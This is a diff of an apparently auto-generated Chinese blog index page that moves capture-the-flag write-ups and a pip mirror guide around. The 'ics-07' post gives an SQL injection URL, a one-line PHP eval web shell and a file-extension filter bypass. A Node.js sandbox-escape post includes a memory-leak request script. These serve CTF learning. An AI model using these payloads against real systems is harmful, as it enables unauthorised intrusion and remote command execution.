@@ -108,68 +108,6 @@
     
     
     <article
-  id="post-ics-07"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2019/05/26/ics-07/"
-    >ics-07</a> 
-</h2>
- 
-
-      
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2019/05/26/ics-07/" class="article-date">
-  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
-</a> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/web/">web</a> / <a class="article-category-link" href="/categories/web/ctf/">ctf</a>
-  </div>
-   
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <p>进入后发现项目管理里面有子页面</p>
-<p>里面可以直接查看源代码   已经给出注释</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;cetc7&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[page])) &#123;</span><br><span class="line">      show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">      <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[page]) &amp;&amp; <span class="variable">$_GET</span>[page] != <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">      header(<span class="string">&#x27;Location: ?page=flag.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">		<span class="comment">//这段就是无论如何都定向到flag.php</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;form action=<span class="string">&quot;#&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">      page : &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;page&quot;</span> value=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">      id : &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;id&quot;</span> value=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;br /&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;index.phps&quot;</span>&gt;view-source&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]) &#123;</span><br><span class="line">       <span class="variable">$con</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;con&#x27;</span>];</span><br><span class="line">       <span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">       <span class="variable">$filename</span> = <span class="string">&quot;backup/&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+\.ph(p[3457]?|t|tml)$/i&#x27;</span>, <span class="variable">$filename</span>))&#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&quot;Bad file extension&quot;</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            chdir(<span class="string">&#x27;uploaded&#x27;</span>);</span><br><span class="line">           <span class="variable">$f</span> = fopen(<span class="variable">$filename</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">           fwrite(<span class="variable">$f</span>, <span class="variable">$con</span>);</span><br><span class="line">           fclose(<span class="variable">$f</span>);</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="meta">?&gt;</span></span><br><span class="line">		<span class="comment">//如果session 是admin的session  就执行 </span></span><br><span class="line">         	<span class="comment">//CON 和file 是post的con 和file </span></span><br><span class="line">             <span class="comment">// 文件目录是backup/加上file</span></span><br><span class="line">         <span class="comment">//之后是对于con的waf</span></span><br><span class="line">         <span class="comment">//如果绕过waf ，文件就被提交到uploaded</span></span><br><span class="line">         <span class="comment">//con 是命令执行  就是传马的 所以最后是uploaded/backup/</span></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[id]) &amp;&amp; floatval(<span class="variable">$_GET</span>[id]) !== <span class="string">&#x27;1&#x27;</span> &amp;&amp; substr(<span class="variable">$_GET</span>[id], -<span class="number">1</span>) === <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">        <span class="variable">$id</span> = mysql_real_escape_string(<span class="variable">$_GET</span>[id]);</span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;select * from cetc007.user where id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$result</span> = mysql_fetch_object(<span class="variable">$result</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="literal">False</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(!<span class="variable">$result</span>)<span class="keyword">die</span>(<span class="string">&quot;&lt;br &gt;something wae wrong ! &lt;br&gt;&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;id: &quot;</span>.<span class="variable">$result</span>-&gt;id.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;name:&quot;</span>.<span class="variable">$result</span>-&gt;user.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span>;</span><br><span class="line">      &#125;</span><br><span class="line">	<span class="comment">//就是你要有id id转浮点数不等于1 id最后一位是9 这个地方用万能密码绕过</span></span><br><span class="line">	<span class="comment">//可以让session 为admin</span></span><br><span class="line">     <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p>给出payload</p>
-<p>url 是</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://111.200.241.244:49771/index.php</span><br><span class="line">?page=flag.php</span><br><span class="line">&amp;id=1&#x27;or &#x27;9&#x27;=&#x27;9</span><br><span class="line">&amp;submit=%E6%8F%90%E4%BA%A4</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
-
-<p>data段是</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">con=&quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;])?&gt;&quot;&amp;file=d.php/cmd.php/..</span><br></pre></td></tr></table></figure>
-
- 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-    </footer>
-  </div>
-
-    
- 
-    
-</article>
-
-    
-    <article
   id="post-FlatScience"
   class="article article-type-post"
   itemscope
@@ -387,134 +325,6 @@
 <p>5秒下好</p>
 <p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gvl2u4m8r4j60ip031wgo02.jpg" alt="ATN[~$]ZM{T~TFV3D41H(PX.png"></p>
 <p>至此，操作系统基本环境算是配置完成了</p>
- 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-    </footer>
-  </div>
-
-    
- 
-    
-</article>
-
-    
-    <article
-  id="post-pip换源"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2019/05/26/pip%E6%8D%A2%E6%BA%90/"
-    >python pip 换源</a> 
-</h2>
- 
-
-      
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2019/05/26/pip%E6%8D%A2%E6%BA%90/" class="article-date">
-  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
-</a> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E7%94%9F%E6%B4%BB%E5%B0%8F%E6%8A%80%E5%B7%A7/">生活小技巧</a>
-  </div>
-   
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <h1 id="python-pip-换源"><a href="#python-pip-换源" class="headerlink" title="python pip 换源"></a>python pip 换源</h1><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line"></span><br><span class="line">mkdir ~/.pip;vim ~/.pip/pip.conf</span><br></pre></td></tr></table></figure>
-
-<p>添加</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line"></span><br><span class="line">index-url = http://pypi.mirrors.ustc.edu.cn/simple/</span><br></pre></td></tr></table></figure>
-
-<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>在user目录中创建一个pip\pip.ini</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line"></span><br><span class="line">index-url = http://pypi.mirrors.ustc.edu.cn/simple/</span><br></pre></td></tr></table></figure>
-
- 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-    </footer>
-  </div>
-
-    
- 
-    
-</article>
-
-    
-    <article
-  id="post-leaking"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2019/05/26/leaking/"
-    >nodejs沙箱逃逸</a> 
-</h2>
- 
-
-      
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2019/05/26/leaking/" class="article-date">
-  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
-</a> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/web/">web</a> / <a class="article-category-link" href="/categories/web/ctf/">ctf</a>
-  </div>
-   
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <p>nodejs沙箱逃逸</p>
-<p><img src="http://tva1.sinaimg.cn/large/007axxUTgy1gwerdkcp2pj30u20ssqfb.jpg" alt="image.png"></p>
-<p>eval(“var flag_” + randomstring.generate(64) + “ = &quot;flag{“ + flag + “}&quot;;”)</p>
-<p>  if (<em>req</em>.query.data &amp;&amp; <em>req</em>.query.data.length &lt;= 12) {</p>
-<p>​    <em>var</em> vm = new VM({</p>
-<p>​      timeout: 1000</p>
-<p>​    });</p>
-<p>​    console.log(<em>req</em>.query.data);</p>
-<p>​    <em>res</em>.send(“eval -&gt;” + vm.run(<em>req</em>.query.data));</p>
-<p>  } else {</p>
-<p>​    <em>res</em>.send(fs.readFileSync(__filename).toString());</p>
-<p>  }</p>
-<p>其中 要满足<em>req</em>.query.data &amp;&amp; <em>req</em>.query.data.length &lt;= 12</p>
-<p>有get data  且长度小于12</p>
-<p>eval -&gt;” + vm.run(<em>req</em>.query.data</p>
-<p>构建payload</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> _thread</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">req</span>():</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://111.200.241.244:65075/?data=Buffer(1000)&quot;</span></span><br><span class="line">    burp0_cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;42vk7uq3siu00csvncvn1cr3o4&quot;</span>, <span class="string">&quot;td_cookie&quot;</span>: <span class="string">&quot;298269563&quot;</span>&#125;</span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;If-None-Match&quot;</span>: <span class="string">&quot;W/\&quot;599-+8B/Bay7p6jffTGBFcikJZKicLY\&quot;&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">    result=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies).text</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">result</span>):</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;flag&#123;&quot;</span> + re.match(<span class="string">&quot;(.*)flag&#123;(.*)&#125;(.*)&quot;</span>, result).group(<span class="number">2</span>) + <span class="string">&quot;&#125;\n\n\n\n\n\n\n&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        <span class="comment"># try:</span></span><br><span class="line">        <span class="comment">#     _thread.start_new_thread(check(req()))</span></span><br><span class="line">        <span class="comment"># except:</span></span><br><span class="line">        <span class="comment">#     print(&quot;error&quot;)</span></span><br><span class="line">        check(req())</span><br></pre></td></tr></table></figure>
-
  
       <!-- reward -->
       
@@ -764,6 +574,196 @@
 
     
     <article
+  id="post-ics-07"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/05/26/ics-07/"
+    >ics-07</a> 
+</h2>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2019/05/26/ics-07/" class="article-date">
+  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web/">web</a> / <a class="article-category-link" href="/categories/web/ctf/">ctf</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>进入后发现项目管理里面有子页面</p>
+<p>里面可以直接查看源代码   已经给出注释</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;cetc7&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[page])) &#123;</span><br><span class="line">      show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">      <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[page]) &amp;&amp; <span class="variable">$_GET</span>[page] != <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">      header(<span class="string">&#x27;Location: ?page=flag.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">		<span class="comment">//这段就是无论如何都定向到flag.php</span></span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;form action=<span class="string">&quot;#&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">      page : &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;page&quot;</span> value=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">      id : &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;id&quot;</span> value=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;br /&gt;</span><br><span class="line">    &lt;a href=<span class="string">&quot;index.phps&quot;</span>&gt;view-source&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]) &#123;</span><br><span class="line">       <span class="variable">$con</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;con&#x27;</span>];</span><br><span class="line">       <span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">       <span class="variable">$filename</span> = <span class="string">&quot;backup/&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+\.ph(p[3457]?|t|tml)$/i&#x27;</span>, <span class="variable">$filename</span>))&#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&quot;Bad file extension&quot;</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            chdir(<span class="string">&#x27;uploaded&#x27;</span>);</span><br><span class="line">           <span class="variable">$f</span> = fopen(<span class="variable">$filename</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">           fwrite(<span class="variable">$f</span>, <span class="variable">$con</span>);</span><br><span class="line">           fclose(<span class="variable">$f</span>);</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="meta">?&gt;</span></span><br><span class="line">		<span class="comment">//如果session 是admin的session  就执行 </span></span><br><span class="line">         	<span class="comment">//CON 和file 是post的con 和file </span></span><br><span class="line">             <span class="comment">// 文件目录是backup/加上file</span></span><br><span class="line">         <span class="comment">//之后是对于con的waf</span></span><br><span class="line">         <span class="comment">//如果绕过waf ，文件就被提交到uploaded</span></span><br><span class="line">         <span class="comment">//con 是命令执行  就是传马的 所以最后是uploaded/backup/</span></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[id]) &amp;&amp; floatval(<span class="variable">$_GET</span>[id]) !== <span class="string">&#x27;1&#x27;</span> &amp;&amp; substr(<span class="variable">$_GET</span>[id], -<span class="number">1</span>) === <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">        <span class="variable">$id</span> = mysql_real_escape_string(<span class="variable">$_GET</span>[id]);</span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;select * from cetc007.user where id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$result</span> = mysql_fetch_object(<span class="variable">$result</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="literal">False</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(!<span class="variable">$result</span>)<span class="keyword">die</span>(<span class="string">&quot;&lt;br &gt;something wae wrong ! &lt;br&gt;&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;id: &quot;</span>.<span class="variable">$result</span>-&gt;id.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;name:&quot;</span>.<span class="variable">$result</span>-&gt;user.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span>;</span><br><span class="line">      &#125;</span><br><span class="line">	<span class="comment">//就是你要有id id转浮点数不等于1 id最后一位是9 这个地方用万能密码绕过</span></span><br><span class="line">	<span class="comment">//可以让session 为admin</span></span><br><span class="line">     <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>给出payload</p>
+<p>url 是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://111.200.241.244:49771/index.php</span><br><span class="line">?page=flag.php</span><br><span class="line">&amp;id=1&#x27;or &#x27;9&#x27;=&#x27;9</span><br><span class="line">&amp;submit=%E6%8F%90%E4%BA%A4</span><br><span class="line">#</span><br></pre></td></tr></table></figure>
+
+<p>data段是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">con=&quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;])?&gt;&quot;&amp;file=d.php/cmd.php/..</span><br></pre></td></tr></table></figure>
+
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+    
+ 
+    
+</article>
+
+    
+    <article
+  id="post-pip换源"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h2 itemprop="name">
+  <a class="article-title" href="/2019/05/26/pip%E6%8D%A2%E6%BA%90/"
+    >python pip 换源</a> 
+</h2>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2019/05/26/pip%E6%8D%A2%E6%BA%90/" class="article-date">
+  <time datetime="2019-05-26T04:12:57.000Z" itemprop="datePublished">2019-05-26</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%94%9F%E6%B4%BB%E5%B0%8F%E6%8A%80%E5%B7%A7/">生活小技巧</a>
+  </div>
+   
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="python-pip-换源"><a href="#python-pip-换源" class="headerlink" title="python pip 换源"></a>python pip 换源</h1><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line"></span><br><span class="line">mkdir ~/.pip;vim ~/.pip/pip.conf</span><br></pre></td></tr></table></figure>
+
+<p>添加</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line"></span><br><span class="line">index-url = http://pypi.mirrors.ustc.edu.cn/simple/</span><br></pre></td></tr></table></figure>
+
